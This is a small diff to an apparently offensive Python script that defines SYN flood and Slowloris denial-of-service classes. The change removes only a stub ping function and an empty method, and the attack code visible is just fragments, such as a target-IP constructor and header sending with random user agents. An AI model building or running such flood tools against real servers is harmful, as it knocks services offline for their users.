@@ -8,9 +8,6 @@ import time
 
 choose = input('')
 
-def ping():
-    return 'online'
-
 class Synflood:
     def __init__(self, ip, port, thread, time_end=10):
         self.target = ip
@@ -69,9 +66,6 @@ class Slowloris():
         self.send_header(sock, "User-Agent", random.choice(self.ua))
         self.send_header(sock, "Accept-language", "en-US,en;q=0.5")
         return sock
-
-    def starto(self):
-        pass
 
 if choose == '1':
     ip = input('')
